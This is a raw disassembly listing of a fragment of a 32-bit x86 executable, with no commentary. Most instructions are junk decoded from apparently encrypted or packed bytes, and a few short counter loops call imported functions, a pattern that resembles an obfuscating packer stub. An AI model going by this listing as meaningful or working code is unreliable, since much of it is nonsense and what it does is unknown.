  40680a:	xor    al,0x43
  40680c:	mov    edx,0x1d085e71
  406811:	ds test al,0xa2
  406814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406815:	pop    esi
  406816:	(bad)  
  406817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406818:	push   0x2e4cfb77
  40681d:	fadd   DWORD PTR ds:0xc0ce0eae
  406823:	fstp   st(0)
  406825:	jne    0x4067a7
  406827:	jp     0x406840
  406829:	retf   
  40682a:	push   ds
  40682b:	mov    cl,0xf
  40682d:	and    BYTE PTR [ebx+0x3a6254f8],ch
  406833:	mov    ds:0x2384a81d,eax
  406838:	or     esi,ecx
  40683a:	int3   
  40683b:	adc    al,cl
  40683d:	jmp    0x4067ee
  40683f:	loopne 0x406800
  406841:	or     BYTE PTR [ebx-0x79],0x10
  406845:	lahf   
  406846:	inc    esi
  406847:	popa   
  406848:	push   ecx
  406849:	rcl    BYTE PTR [ebx+0x73dde55c],1
  40684f:	or     DWORD PTR [edx],esp
  406851:	dec    esp
  406852:	pop    ecx
  406853:	jmp    0x406873
  406855:	repz jmp 0xa429cd28
  40685b:	lods   eax,DWORD PTR ds:[esi]
  40685c:	es sbb eax,0x1a220c01
  406862:	mov    esi,0xefc5e08c
  406867:	cdq    
  406868:	xchg   edx,eax
  406869:	add    ch,BYTE PTR [ecx+ecx*2+0x25]
  40686d:	and    ebp,DWORD PTR [ecx-0x53611db]
  406873:	jnp    0x4068ad
  406875:	cs ret 
  406877:	fistp  WORD PTR [esi-0x416e6438]
  40687d:	mov    esp,0x8e1e4546
  406882:	call   0x7a437fb
  406887:	lods   eax,DWORD PTR ds:[esi]
  406888:	and    ch,cl
  40688a:	neg    ebp
  40688c:	pop    edi
  40688d:	sub    BYTE PTR [esi-0x7c1f28f0],dh
  406893:	push   0x2e98a727
  406898:	cs xor ebx,edi
  40689b:	xchg   ebx,eax
  40689c:	mov    edi,DWORD PTR [edi-0x4e]
  40689f:	add    BYTE PTR [edi-0x1e],0xfd
  4068a3:	mov    al,0x78
  4068a5:	and    cl,cl
  4068a7:	scas   eax,DWORD PTR es:[edi]
  4068a8:	mov    ds:0x5aef5a25,eax
  4068ad:	rcr    BYTE PTR [ebx],cl
  4068af:	and    al,BYTE PTR [ecx+0x1e]
  4068b2:	dec    ebp
  4068b3:	ret    
  4068b4:	push   ss
  4068b5:	nop
  4068b6:	call   0xa7:0xde1c8075
  4068bd:	sbb    eax,0x74006194
  4068c2:	push   eax
  4068c3:	mov    al,ds:0xbb30a2c
  4068c8:	mov    dl,0x4a
  4068ca:	mov    edi,ebp
  4068cc:	pop    ebx
  4068cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068ce:	sub    ebx,DWORD PTR [ecx+esi*8+0x5d44f77d]
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	or     dh,BYTE PTR [edi+0x26]
  40695e:	aaa    
  40695f:	add    cl,cl
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x406971
  406968:	sahf   
  406969:	dec    ecx
  40696a:	mov    ?,WORD PTR [eax-0x194b36ba]
  406970:	sbb    ebx,DWORD PTR [edi-0x335e5330]
  406976:	mov    ah,0x95
  406978:	in     al,0xea
  40697a:	shl    ah,cl
  40697c:	jmp    0xd5c9987f
  406981:	adc    eax,0xff96cb86
  406986:	xchg   ebx,eax
  406987:	scas   eax,DWORD PTR es:[edi]
  406988:	add    al,dl
  40698a:	xor    dh,dh
  40698c:	das    
  40698d:	mov    ecx,0x80c4c88b
  406992:	inc    edx
  406993:	dec    eax
  406994:	or     esp,DWORD PTR [eax]
  406996:	xor    al,0xbe
  406998:	adc    eax,0x33dd2100
  40699d:	sbb    al,bl
  40699f:	sub    al,0x26
  4069a1:	scas   al,BYTE PTR es:[edi]
  4069a2:	push   ds
  4069a3:	mov    edi,0xaaf6524c
  4069a8:	iret   
  4069a9:	int    0xe4
  4069ab:	sbb    al,BYTE PTR [esi+0x79f1f521]
  4069b1:	fbstp  TBYTE PTR [ecx]
  4069b3:	addr16 cld 
  4069b5:	mov    ebx,0xff4d5a0c
  4069ba:	aad    0xc2
  4069bc:	or     BYTE PTR [esi],bl
  4069be:	in     al,0x93
  4069c0:	push   esi
  4069c1:	ror    DWORD PTR [ebx+0x3e],cl
  4069c4:	or     eax,0x7885b516
  4069c9:	cli    
  4069ca:	cdq    
  4069cb:	xchg   ecx,eax
  4069cc:	ret    
  4069cd:	push   ebx
  4069ce:	xchg   edx,eax
  4069cf:	mov    BYTE PTR [edx-0x4141f10a],dl
  4069d5:	mov    esp,0x640fd91c
  4069da:	xchg   esp,eax
  4069db:	mov    esp,0xf0880403
  4069e0:	jo     0x4069e5
  4069e2:	xchg   DWORD PTR [ebx-0x36],edx
  4069e5:	xchg   esp,eax
  4069e6:	xchg   esp,eax
  4069e7:	adc    bh,BYTE PTR [ebx]
  4069e9:	dec    ebp
  4069ea:	(bad)  
  4069eb:	xlat   BYTE PTR ds:[ebx]
  4069ec:	cmp    al,0xe8
  4069ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ef:	push   esi
  4069f0:	stc    
  4069f1:	div    BYTE PTR ds:0x9fd81efe
  4069f7:	cmp    ebp,DWORD PTR [ebx]
  4069f9:	repnz cmp dl,BYTE PTR [edx+0x2438dbc0]
  406a00:	call   0xc782809
  406a05:	mov    WORD PTR [ebp+0x76156981],fs
  406a0b:	out    0x7f,eax
  406a0d:	aaa    
  406a0e:	test   BYTE PTR [esi],dh
  406a10:	imul   edi,esp,0x8
  406a13:	jns    0x4069aa
  406a15:	jo     0x406a43
  406a17:	dec    edi
  406a18:	inc    eax
  406a19:	inc    esp
  406a1a:	repnz add cl,ah
  406a1d:	and    al,0x5f
  406a1f:	cmp    DWORD PTR [ebp+0x64fb1b5b],ebx
  406a25:	out    dx,eax
  406a26:	out    dx,al
  406a27:	ins    DWORD PTR es:[edi],dx
  406a28:	push   ss
  406a29:	fs dec edx
  406a2b:	fld    TBYTE PTR [edi-0x45]
  406a2e:	mov    edx,0xbd3ea7eb
  406a33:	ror    BYTE PTR [edi+0x17ce21f1],0x99
  406a3a:	sar    DWORD PTR [eax-0x392d8164],cl
  406a40:	pop    edx
  406a41:	psubusw mm6,mm2
  406a44:	les    edi,FWORD PTR ds:0xd34c1f47
  406a4a:	mov    esi,0x2b0a7485
  406a4f:	mov    dl,al
  406a51:	mov    BYTE PTR [esp+edi*1+0x7dc5dd01],cl
  406a58:	jne    0x406a06
  406a5a:	add    esp,edx
  406a5c:	cmp    al,0x33
  406a5e:	dec    esi
  406a5f:	mov    dh,0xec
  406a61:	and    al,0x87
  406a63:	data16 xchg BYTE PTR [edi],ah
  406a66:	int    0xee
  406a68:	loop   0x406a74
  406a6a:	lahf   
  406a6b:	mov    edi,0x54da9aa9
  406a70:	mov    edx,DWORD PTR [esp+edi*4]
  406a73:	push   ds
  406a74:	scas   eax,DWORD PTR es:[edi]
  406a75:	test   al,0xb
  406a77:	neg    DWORD PTR [ebx+ebp*2+0x6ae2e0a6]
  406a7e:	mov    esi,0xe8e94946
  406a83:	and    eax,0x3a582e6b
  406a88:	jno    0x406a54
  406a8a:	(bad)  
  406a8b:	cld    
  406a8c:	and    eax,DWORD PTR [ebp+0x28]
  406a8f:	mov    ds:0x762c21b7,al
  406a94:	inc    edi
  406a95:	push   cs
  406a96:	sbb    DWORD PTR [eax-0x1da0328e],0x13
  406a9d:	mov    edx,0x8d18d5e4
  406aa2:	and    BYTE PTR [edx],0x45
  406aa5:	std    
  406aa6:	das    
  406aa7:	adc    dh,BYTE PTR [ebp-0x290d385a]
  406aad:	mov    ebp,0xe03d8171
  406ab2:	mov    esi,0xbac270b3
  406ab7:	xchg   edi,eax
  406ab8:	cmp    DWORD PTR [ebp-0x40],ebp
  406abb:	sbb    edi,DWORD PTR [ebx]
  406abd:	inc    ecx
  406abe:	(bad)  
  406abf:	retf   0xa705
  406ac2:	xor    eax,0xafd9a9b
  406ac7:	loop   0x406afb
  406ac9:	mul    bh
  406acb:	fimul  DWORD PTR [ebx]
  406acd:	imul   edi,esi,0x8be031d4
  406ad3:	push   0x16
  406ad5:	xchg   esp,eax
  406ad6:	dec    ebx
  406ad7:	sub    DWORD PTR [ecx-0x47],0x32f1cfea
  406ade:	retf   0x2266
  406ae1:	push   ds
  406ae2:	in     eax,dx
  406ae3:	xor    DWORD PTR [ecx-0x18a6a7eb],edi
  406ae9:	ins    DWORD PTR es:[edi],dx
  406aea:	mov    bl,0xd4
  406aec:	cli    
  406aed:	fisub  DWORD PTR [edx]
  406aef:	mov    esi,0x55d74cff
  406af4:	jle    0x406b3e
  406af6:	cmp    edx,DWORD PTR [edi]
  406af8:	cwde   
  406af9:	(bad)  
  406afa:	out    0x2e,al
  406afc:	inc    edx
  406afd:	inc    ebp
  406afe:	push   cs
  406aff:	shl    BYTE PTR [edi+0xb],0x69
  406b03:	hlt    
  406b04:	popf   
  406b05:	imul   BYTE PTR [esi+0x5e]
  406b08:	jb     0x406af5
  406b0a:	adc    ecx,DWORD PTR [edx]
  406b0c:	sbb    edi,DWORD PTR [ebx-0x55]
  406b0f:	push   edx
  406b10:	jg     0x406abe
  406b12:	adc    dh,0xa8
  406b15:	sar    DWORD PTR [ecx-0x741c42b2],0xce
  406b1c:	or     DWORD PTR [edi-0x2],0x18eccc1b
  406b23:	mov    DWORD PTR [esi+0x76],0x9f78bfcf
  406b2a:	mov    al,ds:0xd4e0d100
  406b2f:	bound  ebx,QWORD PTR [ecx]
  406b31:	inc    esi
  406b32:	xchg   edi,eax
  406b33:	sbb    BYTE PTR [ecx],dl
  406b35:	aas    
  406b36:	push   esp
  406b37:	fbstp  TBYTE PTR [eax+0x21]
  406b3a:	sub    al,0xf9
  406b3c:	loopne 0x406b71
  406b3e:	push   esp
  406b3f:	mov    al,ds:0xd7809103
  406b44:	lods   eax,DWORD PTR ds:[esi]
  406b45:	arpl   WORD PTR ds:0x2c6ef9df,cx
  406b4b:	rcr    BYTE PTR [edi+0x3732901e],1
  406b51:	loope  0x406bbf
  406b53:	push   0x1ae0d55d
  406b58:	bound  ebx,QWORD PTR [esp+esi*1+0x7e002c90]
  406b5f:	jns    0x406b9e
  406b61:	clc    
  406b62:	sbb    BYTE PTR [edx+edi*8+0x45],bl
  406b66:	fdivr  DWORD PTR [edx]
  406b68:	repz mov al,0xac
  406b6b:	fisub  WORD PTR [edi-0x14]
  406b6e:	fs out 0x46,eax
  406b71:	icebp  
  406b72:	rol    ebx,0x5c
  406b75:	fldcw  WORD PTR [ebx+esi*2]
  406b78:	jle    0x406bb7
  406b7a:	clc    
  406b7b:	jl     0x406bf9
  406b7d:	int    0x12
  406b7f:	mov    bh,0x69
  406b81:	xchg   DWORD PTR [ebp+0x2a],ebp
  406b84:	imul   esi,edi,0x1f
  406b87:	xor    DWORD PTR [esi-0x7c6d3057],edx
  406b8d:	gs jae 0x406b3d
  406b90:	mov    esp,0x425d3bab
  406b95:	or     ebx,DWORD PTR [ebp+0x324133fd]
  406b9b:	mov    ecx,0xb089113e
  406ba0:	xchg   esi,eax
  406ba1:	out    dx,al
  406ba2:	ins    DWORD PTR es:[edi],dx
  406ba3:	cmp    eax,0xeeed7a7a
  406ba8:	aad    0x11
  406baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bab:	sbb    DWORD PTR [edx],ecx
  406bad:	inc    edi
  406bae:	adc    al,0xf0
  406bb0:	in     al,0xa7
  406bb2:	sub    BYTE PTR [edi],dl
  406bb4:	test   eax,0x53993a57
  406bb9:	rcr    DWORD PTR ds:0xf48d1049,1
  406bbf:	fild   QWORD PTR [eax-0x285ee12c]
  406bc5:	xchg   esp,eax
  406bc6:	cmp    bh,BYTE PTR [ebx+0x4f]
  406bc9:	inc    eax
  406bca:	add    BYTE PTR ds:0xba6cb41e,dl
  406bd0:	mov    dl,0xcd
  406bd2:	mov    ebx,0xed493215
  406bd7:	out    dx,al
  406bd8:	retf   
  406bd9:	lods   al,BYTE PTR ds:[esi]
  406bda:	stc    
  406bdb:	pop    ss
  406bdc:	retf   
  406bdd:	dec    eax
  406bde:	jle    0x406c05
  406be0:	hlt    
  406be1:	icebp  
  406be2:	leave  
  406be3:	sbb    DWORD PTR ds:0x33af4a20,esp
  406be9:	dec    ebp
  406bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406beb:	lock jle 0x406ba7
  406bee:	int3   
  406bef:	jns    0x406c54
  406bf1:	push   esp
  406bf2:	sar    DWORD PTR [ebp-0xce2fbe7],1
  406bf8:	push   ebx
  406bf9:	xor    eax,0x29b90ebf
  406bfe:	push   es
  406bff:	xor    DWORD PTR ds:0x56eb8f63,ebx
  406c05:	cmp    al,cl
  406c07:	ins    BYTE PTR es:[edi],dx
  406c08:	mov    al,ds:0xc0237899
  406c0d:	mov    ah,0x72
  406c0f:	jmp    0x796a4be3
  406c14:	fidiv  WORD PTR [eax-0x4c65c333]
  406c1a:	inc    ebx
  406c1b:	xchg   edx,eax
  406c1c:	pop    eax
  406c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c1e:	or     esp,DWORD PTR [edx]
  406c20:	jle    0x406c7d
  406c22:	ins    BYTE PTR es:[edi],dx
  406c23:	fist   DWORD PTR [ebx]
  406c25:	mov    bl,0x31
  406c27:	or     DWORD PTR [ebx+0x4b],edx
  406c2a:	mov    ?,WORD PTR [eax-0x6f]
  406c2d:	jmp    0xccd0:0x512aedf3
  406c34:	xlat   BYTE PTR ds:[ebx]
  406c35:	lock int3 
  406c37:	jg     0x406c89
  406c39:	nop
  406c3a:	jmp    0xe576:0xaeb0a11e
  406c41:	inc    esi
  406c42:	out    dx,eax
  406c43:	js     0x406c01
  406c45:	fiadd  WORD PTR [esp+ecx*4-0x5e]
  406c49:	cmc    
  406c4a:	pop    ecx
  406c4b:	jns    0x406bfb
  406c4d:	jecxz  0x406be3
  406c4f:	imul   ebx,DWORD PTR [ebx+ebx*8],0x40
  406c53:	mov    eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x30],ebx
  406c91:	sub    BYTE PTR [edx],al
  406c93:	cmp    al,0x6c
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cde
  406c9d:	mov    dl,0x70
  406c9f:	and    DWORD PTR [ebx+0x566f6735],eax
  406ca5:	xor    DWORD PTR [eax-0x21],edi
  406ca8:	sbb    al,bl
  406caa:	ins    DWORD PTR es:[edi],dx
  406cab:	sbb    esp,DWORD PTR [ebx-0x2]
  406cae:	shl    dl,0x86
  406cb1:	jl     0x406d09
  406cb3:	mov    ebx,0x7d6500f5
  406cb8:	jecxz  0x406d15
  406cba:	and    ch,BYTE PTR [edi]
  406cbc:	push   ebp
  406cbd:	int    0x9
  406cbf:	jae    0x406d1c
  406cc1:	idiv   BYTE PTR [eax+0x7bf59fe8]
  406cc7:	xor    edx,edx
  406cc9:	push   es
  406cca:	push   esi
  406ccb:	fidivr WORD PTR [esi+0x70]
  406cce:	xchg   edx,eax
  406ccf:	push   0xffffffd8
  406cd1:	clc    
  406cd2:	jecxz  0x406d0c
  406cd4:	sbb    al,0x5b
  406cd6:	std    
  406cd7:	mov    cs,ebp
  406cd9:	mov    al,0xca
  406cdb:	popf   
  406cdc:	jo     0x406cf0
  406cde:	sar    DWORD PTR [ebp+eax*8+0x1e],0x93
  406ce3:	mov    bh,0x54
  406ce5:	dec    ebp
  406ce6:	cmp    BYTE PTR [edi],al
  406ce8:	cs jbe 0x406ce5
  406ceb:	push   0x17881222
  406cf0:	jnp    0x406d54
  406cf2:	mov    DWORD PTR [eax+eiz*1+0x72],eax
  406cf6:	mov    eax,ds:0xcb3b8dc
  406cfb:	outs   dx,DWORD PTR ds:[esi]
  406cfc:	and    DWORD PTR [ecx+0xb],ecx
  406cff:	jnp    0x406cc8
  406d01:	inc    esp
  406d02:	push   esp
  406d03:	sub    al,0xfc
  406d05:	shr    BYTE PTR [esi+ecx*8],1
  406d08:	and    DWORD PTR [edi+0x12],ecx
  406d0b:	(bad)  
  406d0c:	fld    TBYTE PTR ds:0x77f2c272
  406d12:	add    DWORD PTR cs:[eax-0x37f8888],ecx
  406d19:	(bad)  
  406d1a:	lahf   
  406d1b:	ret    0xf9c5
  406d1e:	repz cmp BYTE PTR [ecx-0x38],ah
  406d22:	in     eax,dx
  406d23:	in     al,dx
  406d24:	pop    es
  406d25:	test   al,0x60
  406d27:	icebp  
  406d28:	push   es
  406d29:	ret    
  406d2a:	pop    ss
  406d2b:	aaa    
  406d2c:	sti    
  406d2d:	mov    ecx,0x48bedd4e
  406d32:	addr16 mov ah,0x8f
  406d35:	jne    0x406cec
  406d37:	cmp    bh,BYTE PTR [ebx-0x525c4d13]
  406d3d:	iret   
  406d3e:	in     al,dx
  406d3f:	dec    eax
  406d40:	shl    DWORD PTR [eax+0x797d05f6],1
  406d46:	nop
  406d47:	sbb    ebp,ebp
  406d49:	pop    es
  406d4a:	in     eax,0x40
  406d4c:	test   eax,0xcc50fa06
  406d51:	add    edx,DWORD PTR [eax]
  406d53:	adc    ch,BYTE PTR [edi-0x3848626b]
  406d59:	inc    ebx
  406d5a:	bound  eax,QWORD PTR [ebp+0x504e60b9]
  406d60:	cmp    eax,0xdfc1411d
  406d65:	mov    al,0xcc
  406d67:	cmp    BYTE PTR [edx-0x31e8f8fa],0x15
  406d6e:	mov    ss,ebx
  406d70:	call   0x278caa09
  406d75:	add    ebx,ebx
  406d77:	push   edi
  406d78:	mov    edx,0x4402baf7
  406d7d:	out    dx,eax
  406d7e:	push   edx
  406d7f:	std    
  406d80:	int3   
  406d81:	cmc    
  406d82:	mov    edx,esp
  406d84:	push   ds
  406d85:	jo     0x406da7
  406d87:	es inc esi
  406d89:	mov    ecx,0x3a8bbd03
  406d8e:	icebp  
  406d8f:	leave  
  406d90:	xor    edx,DWORD PTR [ecx-0x56]
  406d93:	sbb    DWORD PTR [ebp-0x187c6b2],eax
  406d99:	and    DWORD PTR [eax],esp
  406d9b:	mov    bh,0xaf
  406d9d:	sti    
  406d9e:	(bad)  
  406d9f:	xor    dh,BYTE PTR [edx]
  406da1:	loope  0x406dd0
  406da3:	mov    ss,WORD PTR [edi+0x150b5e8d]
  406da9:	adc    edx,ecx
  406dab:	xor    edx,edx
  406dad:	cmp    eax,0x260cf827
  406db2:	mov    ecx,DWORD PTR [ebp+0x34]
  406db5:	mov    ch,0x22
  406db7:	xor    BYTE PTR [ebx+0x757f29c1],bh
  406dbd:	jge    0x406d6d
  406dbf:	call   0xc40b:0x20792fa9
  406dc6:	cmp    ecx,DWORD PTR [edi+0x6996d178]
  406dcc:	pop    DWORD PTR [ecx]
  406dce:	mov    al,ds:0xbefb9e2e
  406dd3:	pop    ebp
  406dd4:	pop    ecx
  406dd5:	(bad)  
  406dd6:	push   0x693dfdef
  406ddb:	or     ch,BYTE PTR [edx-0x43e57406]
  406de1:	das    
  406de2:	repnz call 0x3534:0x516918b8
  406dea:	jnp    0x406dad
  406dec:	leave  
  406ded:	psubw  mm6,QWORD PTR [ebx+esi*1-0x22]
  406df2:	rol    BYTE PTR [esi],0x4a
  406df5:	jne    0x406dd4
  406df7:	aaa    
  406df8:	sbb    esi,edx
  406dfa:	popf   
  406dfb:	lock call 0x46f7eb92
  406e01:	mov    ecx,0x9123eefa
  406e06:	lahf   
  406e07:	mov    ebx,0xe7aeeefd
  406e0c:	xchg   BYTE PTR [ecx+edi*1-0x2ebaf770],dh
  406e13:	add    eax,0xffaa1bcd
  406e18:	sub    DWORD PTR [ebx],ebx
  406e1a:	xlat   BYTE PTR ds:[ebx]
  406e1b:	adc    BYTE PTR [eax+0x7],al
  406e1e:	jle    0x406ddd
  406e20:	int    0xd4
  406e22:	pushf  
  406e23:	fadd   QWORD PTR [edx-0x19]
  406e26:	jmp    0x9d80cf32
  406e2b:	mov    ecx,0x7aebb934
  406e30:	out    dx,eax
  406e31:	sub    ebx,DWORD PTR [edi-0x28]
  406e34:	dec    edi
  406e35:	in     eax,0xe6
  406e37:	sbb    bh,al
  406e39:	push   edi
  406e3a:	bound  ebp,QWORD PTR [edi+0x74f963d2]
  406e40:	in     eax,dx
  406e41:	mov    edi,0xd11855a5
  406e46:	popf   
  406e47:	outs   dx,BYTE PTR ds:[esi]
  406e48:	ins    DWORD PTR es:[edi],dx
  406e49:	cmp    ch,BYTE PTR ds:0x175fe0a
  406e4f:	(bad)  
  406e50:	(bad)
  406e53:	aam    0xc0
  406e55:	push   edx
  406e56:	inc    esi
  406e57:	cmp    al,0x7b
  406e59:	popf   
  406e5a:	fwait
  406e5b:	and    eax,0xa169258e
  406e60:	(bad)  
  406e61:	xlat   BYTE PTR ds:[bx]
  406e63:	rcl    BYTE PTR [esi],1
  406e65:	xchg   esp,eax
  406e66:	jmp    0x406e6c
  406e68:	push   esp
  406e69:	and    BYTE PTR [ecx],cl
  406e6b:	mov    ss,WORD PTR [ebx]
  406e6d:	add    al,0xb4
  406e6f:	shl    bl,0xe7
  406e72:	sbb    DWORD PTR [esi+0x5c],esp
  406e75:	fdivr  DWORD PTR [esi+esi*8-0x6]
  406e79:	xchg   BYTE PTR ds:0x6dc7570,bh
  406e7f:	push   edx
  406e80:	or     bh,BYTE PTR [ebp+0x64]
  406e83:	ja     0x406eb0
  406e85:	mov    esp,DWORD PTR [ecx+0x1a]
  406e88:	pop    esi
  406e89:	test   DWORD PTR fs:[esi],eax
  406e8c:	stc    
  406e8d:	sub    eax,0xe9796635
  406e92:	xchg   ebx,eax
  406e93:	loopne 0x406ed1
  406e95:	dec    esp
  406e96:	dec    edx
  406e98:	push   ecx
  406e99:	mov    ch,0x5b
  406e9b:	cmc    
  406e9c:	jecxz  0x406e25
  406e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e9f:	xor    al,0x52
  406ea1:	iret   
  406ea2:	inc    eax
  406ea3:	dec    ebp
  406ea4:	push   eax
  406ea5:	mov    esi,0xb206fe0d
  406eaa:	jns    0x406e74
  406eac:	and    al,dh
  406eae:	cli    
  406eaf:	or     edx,0x47011d24
  406eb5:	arpl   WORD PTR [edi+esi*1+0x27],si
  406eb9:	xlat   BYTE PTR ds:[ebx]
  406eba:	rol    DWORD PTR [eax-0x61d5d461],cl
  406ec0:	fisubr DWORD PTR ds:0xc99670b2
  406ec6:	shl    BYTE PTR [edi+eiz*2-0xc],1
  406eca:	gs dec esi
  406ecc:	popf   
  406ecd:	and    BYTE PTR [ebx+0x79],al
  406ed0:	sub    DWORD PTR [edi+0xad91abf],edx
  406ed6:	out    dx,eax
  406ed7:	pop    ds
  406ed8:	xor    al,BYTE PTR [eax-0xd]
  406edb:	mov    dl,0xcc
  406edd:	imul   ecx,DWORD PTR [eax],0x52
  406ee0:	jne    0x406f32
  406ee2:	(bad)  
  406ee3:	sahf   
  406ee4:	ret    0xb335
  406ee7:	jae    0x406f30
  406ee9:	(bad)  
  406eea:	mov    WORD PTR [ebp+0x5d81a999],ds
  406ef0:	jecxz  0x406f51
  406ef2:	shr    BYTE PTR [ebx+0x6af320ce],cl
  406ef8:	call   0x2263ef5
  406efd:	test   al,0x10
  406eff:	popf   
  406f00:	and    al,0x60
  406f02:	or     dh,cl
  406f04:	mov    ds,WORD PTR [ebp-0x44]
  406f07:	repnz sub eax,0x171b1e20
  406f0d:	sbb    ch,BYTE PTR [edx]
  406f0f:	inc    eax
  406f10:	(bad)  [esi+0x41]
  406f13:	js     0x406eeb
  406f15:	cwde   
  406f16:	aad    0x9d
  406f18:	sub    al,0x5
  406f1a:	js     0x406ef8
  406f1c:	pusha  
  406f1d:	add    ebx,DWORD PTR [esi-0x5786cdd7]
  406f23:	sbb    esi,DWORD PTR [edx]
  406f25:	push   0x61
  406f27:	in     al,0xaf
  406f29:	in     eax,dx
  406f2a:	xchg   bh,ah
  406f2c:	imul   edi,edi,0xffffffd6
  406f2f:	lds    esi,FWORD PTR [edi]
  406f31:	and    eax,0x11545cd
  406f36:	call   0x854c:0x60093afe
  406f3d:	mov    ebx,?
  406f3f:	loop   0x406f63
  406f41:	lods   al,BYTE PTR ds:[esi]
  406f42:	mov    al,ds:0xe1b42b04
  406f47:	add    ebx,DWORD PTR [edx-0x389c3ee3]
  406f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4e:	pop    esp
  406f4f:	aad    0x2c
  406f51:	mov    eax,0x879f67ca
  406f56:	jmp    0x2d12:0xc5a3a18
  406f5d:	loopne 0x406f2e
  406f5f:	stc    
  406f60:	push   0x38
  406f62:	iret   
  406f63:	out    dx,eax
  406f64:	push   ss
  406f65:	add    eax,0x244b06a0
  406f6a:	mov    edx,0x1cf670d1
  406f6f:	scas   eax,DWORD PTR es:[edi]
  406f70:	ret    0x33f0
  406f73:	dec    esp
  406f74:	jno    0x406f21
  406f76:	fiadd  DWORD PTR [esi+0x47299408]
  406f7c:	add    BYTE PTR [eax],0xf3
  406f7f:	cmp    DWORD PTR [ecx+0x5c5655e0],0x66716312
  406f89:	add    eax,ecx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x71,al
  40702c:	cwde   
  40702d:	(bad)  [esi+0x58]
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407029
  407038:	fmul   QWORD PTR [edx]
  40703a:	js     0x40703c
  40703c:	push   eax
  40703d:	outs   dx,DWORD PTR ds:[esi]
  40703e:	push   esi
  40703f:	mul    ah
  407041:	outs   dx,BYTE PTR ds:[esi]
  407042:	dec    BYTE PTR [edx]
  407044:	cmp    eax,0xfde67a38
  407049:	add    BYTE PTR [esi-0x2d],dh
  40704c:	jmp    0xde5bbbca
  407051:	ret    
  407052:	ins    BYTE PTR es:[edi],dx
  407053:	sahf   
  407054:	xor    eax,0x1b544b11
  407059:	push   eax
  40705a:	push   cs
  40705b:	mov    bl,0x57
  40705d:	xchg   BYTE PTR [ebx+0x36],al
  407060:	cdq    
  407061:	xchg   ebp,eax
  407062:	mov    dl,0xf8
  407064:	cmc    
  407065:	adc    esi,DWORD PTR [ebp+0x6bfd2c2]
  40706b:	rcr    BYTE PTR [edi+ecx*4],cl
  40706e:	ds addr16 xor cl,dl
  407072:	pop    edx
  407073:	dec    DWORD PTR [eax+0x24]
  407076:	or     edi,DWORD PTR [ecx]
  407078:	dec    eax
  407079:	mov    ds,esp
  40707b:	rcl    BYTE PTR [edi+0x7a],cl
  40707e:	bound  ebp,QWORD PTR [ebp-0x7f]
  407081:	retf   0x32a4
  407084:	add    eax,0x6179beea
